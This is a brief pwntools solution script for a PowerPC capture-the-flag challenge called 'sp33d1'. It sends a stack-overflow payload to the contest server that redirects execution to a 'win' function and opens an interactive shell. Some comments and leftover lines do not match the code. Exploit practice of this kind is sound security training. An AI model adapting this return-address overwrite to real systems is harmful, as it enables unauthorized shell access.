from pwn import *
import time

context.arch = 'powerpc'
#context.log_level = 'debug'

# First, close any existing processes using port 1234
os.system('pkill -f "qemu-ppc -g 1234"')

# Start QEMU with GDB server explicitly
cmd = ['qemu-ppc', '-g', '1234', './sp33d1']

#cmd = ['qemu-ppc', '-g', '1234', './sp33d1']
p = process(cmd)
p = remote("sp33d.play.hfsc.tf", 20020)


p.recvuntil(b"pwn: ")

# Use the existing /bin/sh string at 0x10077a8c
cmd_addr = 0x40001038

# Craft payload
payload = p32(cmd_addr)
payload += p32(cmd_addr)
payload += p32(cmd_addr)
payload += p32(cmd_addr)
payload += p32(cmd_addr)
payload += p32(cmd_addr)
payload += p32(0x10077a8c)

payload += p32(0x10000610)      # Address of win function
payload += p32(cmd_addr)  
payload += p32(cmd_addr)        # First argument to win (address of "/bin/sh")

p.sendline(payload)

p.interactive()
